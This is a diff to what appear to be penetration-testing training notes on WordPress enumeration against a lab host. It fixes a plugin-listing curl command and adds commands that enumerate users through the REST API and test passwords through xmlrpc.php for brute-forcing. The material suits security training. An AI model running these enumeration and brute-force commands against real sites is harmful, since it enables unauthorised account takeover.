@@ -4,6 +4,8 @@
   - [Core version](#core-version)
   - [Plugins and themes](#plugins-and-themes)
   - [Directory indexing](#directory-indexing)
+  - [Users](#users)
+    - [Login](#login)
 
 ## Core version
 
@@ -37,7 +39,7 @@ You can manually inspect the page source or filter the information using `curl` 
 For example, for _plugins_:
 
 ```console
-]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
+$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
 http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
 http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
@@ -93,3 +95,21 @@ $ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | 
 ===========================================================================
      Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
 ```
+
+## Users
+
+Before version 4.7.1, all users who had published a post could be listed:
+
+```console
+curl http://<TARGET>/wp-json/wp/v2/users | j
+```
+
+### Login
+
+Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This can be performed via the login page or the `xmlrpc.php` page.
+
+```console
+curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
+```
+
+If credentials are not valid, we'll get a `403 faultCode`.
